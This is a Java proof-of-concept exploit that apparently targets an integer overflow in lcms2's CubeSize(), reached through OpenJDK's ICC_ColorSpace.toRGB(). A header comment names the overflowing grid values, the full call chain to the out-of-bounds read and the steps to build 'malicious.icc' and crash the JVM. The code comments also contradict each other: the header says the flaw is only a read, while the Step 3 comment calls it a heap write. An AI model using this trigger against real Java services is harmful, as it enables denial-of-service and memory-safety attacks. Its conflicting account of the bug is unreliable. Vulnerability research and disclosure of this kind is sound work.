import java.awt.color.*;
import java.nio.file.*;

/**
 * JdkPoc.java -- Java proof-of-concept for lcms2 CubeSize() integer overflow (VU-2).
 *
 * Bug (src/cmslut.c, CubeSize(), present in lcms2 <= 2.18 release):
 *   rv *= dim;                     // 32-bit multiply wraps silently on overflow
 *   if (rv > UINT_MAX / dim) ...   // checks the ALREADY-WRAPPED value -- too late
 *
 * With gridPoints=[3,2,5,9,255,255,245], inputChan=7, outputChan=3:
 *   True product (real CLUT nodes) = 4,301,403,750  (overflows uint32)
 *   CubeSize() returns             = 6,436,454      (WRONG -- should return 0)
 *   Data->nEntries                 = 3 * 6,436,454  = 19,309,362 slots
 *   Allocation                     = 19,309,362 * sizeof(uint16) ~= 37 MB
 *
 * The parse-time read loop (cmstypes.c:2630) reads exactly `Data->nEntries`
 * bytes from the ICC file and writes them into slots [0..nEntries-1] of the
 * Tab.T[] uint16 array -- stays within the allocation. There is NO
 * heap-buffer-overflow during parsing.
 *
 * The OOB is a READ that happens later: during transform setup
 * (OptimizeByResampling -> cmsStageSampleCLut16bit) or during
 * cmsDoTransform, the interpolator computes strides from the REAL grid
 * dimensions (not the wrapped CubeSize value) and reads past the
 * undersized LutTable. CWE-125 out-of-bounds read, not CWE-787 write.
 *
 * Trigger path (OpenJDK):
 *   ICC_ColorSpace.toRGB([7 floats])
 *     -> PCMM.createTransform([scnr_7CLR_profile, sRGB_profile])
 *       -> cmsCreateMultiprofileTransform
 *         -> DefaultICCintents -> _cmsReadInputLUT(AToB0)
 *           -> cmsReadTag -> Type_LUTA2B_Read -> ReadCLUT
 *             -> cmsStageAllocCLut16bitGranular   [CubeSize wraps; 37 MB alloc]
 *         -> cmsCreateExtendedTransform -> EvalNInputs [SIGSEGV: OOB CLUT read]
 *
 * Profile notes:
 *   - Device class 'scnr' (scanner): Java can chain [scnr, sRGB] via toRGB()
 *   - Color space '7CLR': Java's iccCStoJCS() accepts '7CLR', not 'MCH7'
 *   - PCS 'Lab ': requires outputChan=3 so CLUT output matches Lab channel count
 *   - Only AToB0 tag; no curves, no matrix
 *
 * Usage:
 *   python3 gen_icc.py --output malicious.icc
 *   javac JdkPoc.java
 *   java JdkPoc malicious.icc
 *   # Expected: JVM crashes with SIGSEGV in liblcms2 Eval4Inputs
 */
public class JdkPoc {

    public static void main(String[] args) throws Exception {
        if (args.length < 1) {
            System.err.println("Usage: java JdkPoc <path-to-icc-file>");
            System.exit(1);
        }

        System.out.println("[*] lcms2 VU-2 CubeSize overflow -- JDK POC");

        // Step 1: Load profile bytes and parse header/tag directory.
        // cmsOpenProfileFromMem() reads only the 128-byte header and tag offsets;
        // the AToB0 CLUT body is NOT parsed here (lcms2 lazy tag loading).
        byte[] data = Files.readAllBytes(Paths.get(args[0]));
        System.out.println("[*] Profile size: " + data.length + " bytes (" +
                           data.length / 1024 / 1024 + " MB)");

        ICC_Profile profile = ICC_Profile.getInstance(data);
        System.out.println("[+] ICC_Profile.getInstance() OK  (numComponents=" +
                           profile.getNumComponents() + ", tag bodies still deferred)");

        // Step 2: Wrap in ICC_ColorSpace (still no CLUT parsing here).
        ICC_ColorSpace cs = new ICC_ColorSpace(profile);
        System.out.println("[+] ICC_ColorSpace created");

        // Step 3: Call toRGB() to trigger the CLUT parsing and SIGSEGV.
        // Java creates a 2-profile transform chain: [7CLR_scnr, sRGB].
        // lcms2 calls _cmsReadInputLUT -> ReadCLUT -> CubeSize overflow:
        //   - Allocates undersized buffer (nEntries=19,309,362 uint16 = ~37 MB)
        //   - Reads 19,309,362 bytes from file into that buffer (OOB heap write)
        // Then EvalNInputs interpolates on the corrupted CLUT -> SIGSEGV -> JVM crash.
        System.out.println("[*] Calling cs.toRGB() to trigger CLUT parsing...");
        System.out.println("    Expected: JVM SIGSEGV in liblcms2 Eval4Inputs");
        float[] input = new float[]{0.5f, 0.5f, 0.5f, 0.5f, 0.5f, 0.5f, 0.5f};
        float[] rgb = cs.toRGB(input);

        // If we reach here, lcms2 may be patched (CubeSize correctly returns 0,
        // causing cmsReadTag to return NULL -> CMMException thrown and caught by JVM)
        // or heap corruption occurred without a crash.
        System.out.println("[!] toRGB() returned without crash: R=" + rgb[0] +
                           " G=" + rgb[1] + " B=" + rgb[2]);
        System.out.println("    lcms2 may be patched, or heap is silently corrupted.");
    }
}
